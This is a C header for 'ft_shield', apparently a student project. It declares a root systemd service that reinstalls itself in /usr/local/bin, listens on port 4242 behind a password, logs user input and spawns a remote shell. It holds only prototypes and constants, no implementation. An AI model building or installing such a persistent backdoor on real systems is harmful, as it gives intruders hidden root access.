#ifndef FT_SHIELD_H
#define FT_SHIELD_H

#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/file.h>
#include <arpa/inet.h>
#include <sys/epoll.h>
#include <string.h>
#include <sys/wait.h>
#include <signal.h>

#define LOCK_FILE "/var/lock/ft_shield.lock"
#define LOG_FILE "/var/log/ft_shield.log"
#define FT_SHIELD "./ft_shield"
#define BIN_DIR "/usr/bin"
#define BIN_FILE "/usr/local/bin/ft_shield"
#define LOGIN "rbardet-\n"
#define PORT 4242
#define MAX_USER 3
#define MAX_EVENT 10
#define LIMIT_REACH "Too many users connected, retry later\n"
#define FAILED_CONNECTION "Failed to connect\n"
#define UNDEFINED_PASSWORD "Error: password not set create it in root mode (export PASSWORD=<value>)\n"
#define EXISTING_LOCK "Daemon alredy running\n"
#define NEED_SUDO "Sudo right needed\n"
#define ASK_PASS "Enter the server password: "
#define WRONG_PASS "Wrong pass. Goodbye\n"
#define BUFFER_SIZE 256
#define PASS_FILE "/root/.password"

#define LOG_LIMIT_REACH "[ERROR]: connection failed (reason: limit reached)\n"
#define LOG_EPOLL_FAILED "[ERROR]: connection failed (reason: failed to add to epoll)\n"
#define LOG_DISCONNECT_USER "[INFO]: user disconnected\n"
#define LOG_NEW_USER "[INFO]: new user connected\n"
#define LOG_USER_INPUT "[INPUT]: "
#define LOG_WRONG_PASS "[INFO]: connection attempt with wrong pass\n"

#define CMD_HELP "?"
#define HELP_MSG "? show help\nshell Spawn remote shell on 4242\n"
#define CMD_SHELL "shell"
#define SHELL_MSG "Spawning shell on port 4242\n"

#define SYS_DIR "/etc/systemd/system"
#define SYS_FILE "/etc/systemd/system/ft_shield.service"
#define SYSTEMD_OPT "[Unit]\n\
Description=ft_shield Service\n\
After=network.target\n\
\n\
[Service]\n\
ExecStart=/usr/local/bin/ft_shield\n\
Restart=always\n\
User=root\n\
\n\
[Install]\n\
WantedBy=multi-user.target\n"

typedef enum {
	LOG_INFO,
	LOG_INPUT,
} LOG_TYPE;

typedef struct {
	int fd;
	struct epoll_event event;
	struct epoll_event events[MAX_EVENT];
} EPOLL_STRUCT;

extern int userNb;
extern EPOLL_STRUCT epoll;
extern bool root_shell;

#define EPOLL_ERROR ((EPOLL_STRUCT){.fd = -1})

bool existing_lock();
void create_lock();
void delete_lock();

void run_server();

void accept_user(int sockfd, EPOLL_STRUCT epoll);
void refuse_user(int sockfd);
void disconnect_user(int userfd, EPOLL_STRUCT epoll);

void create_log();
void close_log();
void log_event(char *log, LOG_TYPE __TYPE__);
void remove_nl(const char *buff);

bool set_password();
bool ask_password(int userfd);

void read_input(int userfd, EPOLL_STRUCT epoll);
void shell(int userfd);

void systemd();

#endif